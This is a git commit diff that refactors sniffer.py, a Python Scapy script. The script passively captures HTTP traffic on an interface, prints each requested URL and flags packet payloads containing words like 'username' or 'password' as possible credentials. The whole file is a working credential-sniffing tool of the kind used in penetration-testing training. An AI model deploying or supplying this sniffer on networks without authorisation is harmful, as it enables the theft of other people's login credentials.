5f407213eed376426d3dfe91caa197129b60092a
Rosenmatt1 <rosenmatt1@gmail.com>
2021-02-10 00:27:34 -0500

    Converted packt bytes object to string for python3

--- sniffer.py
+++ sniffer.py
@@ -5,19 +5,27 @@ from scapy.layers import http
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "user", "login", "password", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                print("[+] Possible username/password " + load + "\n\n")
+                return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)
-        print(url)
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url.decode())
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username", "user", "login", "password", "pass"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
-                    break
-
-
+# the packet is a bytes like object and needs to be converted to a string
+# .decode() method turns into a string like str
 sniff("eth0")
